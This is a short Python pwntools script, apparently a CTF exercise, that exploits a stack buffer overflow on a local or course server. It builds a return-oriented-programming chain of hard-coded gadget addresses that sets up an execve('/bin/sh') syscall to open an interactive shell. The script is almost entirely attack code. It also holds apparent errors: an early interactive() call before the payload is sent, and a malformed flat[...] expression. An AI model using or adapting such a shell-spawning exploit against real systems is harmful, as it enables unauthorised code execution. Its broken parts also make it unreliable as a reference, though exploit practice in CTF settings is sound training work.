from pwn import *

context.arch = 'amd64'

r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10133)

r.recvuntil(':')
#note rsi keep the addr of buf
#the offset from buf to ret is 40

#r.recvuntil('lol',timeout = 7)
r.interactive()
pre = '/bin/sh\0' + 'x'*32
push_rsi_ret = p64(0x41ec92)
pop_rdi_ret = p64(0x401456)

xor_eax_ret = p64(0x4014d0)
add_eax_0x1d_ret = p64(0x4260ce)        #0x1d = 29 ,59 = 29*2 + 1
add_eax_1_ret = p64(0x466671)
syscall_ret = p64(0x4671b5)
#construct rop
context.arch = 'amd64'
rop = pre + flat[push_rsi_ret + pop_rdi_ret + xor_eax_ret + add_eax_0x1d_ret + add_eax_0x1d_ret + add_eax_1_ret + syscall_ret]

#total len = 7*8 -> 56 byte -> 40 + 56 -> 96 <  160
r.send(rop)
r.interactive()

